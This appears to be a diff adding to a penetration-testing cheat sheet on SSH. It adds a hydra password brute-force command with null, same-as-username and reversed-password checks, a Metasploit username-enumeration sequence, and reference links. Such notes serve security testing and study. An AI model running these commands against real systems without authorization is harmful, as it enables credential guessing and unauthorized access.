@@ -42,10 +42,40 @@ nmap ‐sV ‐O ‐‐script=ssh* ‐p22 ‐T5 <IP>
 hydra ‐t 10 ‐L <User List> ‐P <Password List> ssh://<IP>
 ```
 
+```
+hydra ‐t 10 ‐e nsr ‐L <User List> ‐P <Password List> ssh://<IP>
+```
+
+* "n" stands for null password (the password is empty).
+* "s" stands for log in as password (username=password).
+* "r" stands for reversed login (e.g., if the username is root, then the password will be toor).
+
+#### Metasploit
+
+_**Username Enumeration:**_
+
+```
+msfconsole
+
+use auxiliary/scanner/ssh/ssh_enumusers
+
+set RHOSTS <IP>
+
+set USER_FILE <path to wordlist>
+
+set RPORT 22
+
+set THREADS 25
+
+run
+```
 
 
 
+***
 
 ## REFERENCES
 
 * [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)
+* [https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh)
+* [https://www.rapid7.com/db/modules/auxiliary/scanner/ssh/ssh\_enumusers/](https://www.rapid7.com/db/modules/auxiliary/scanner/ssh/ssh\_enumusers/)
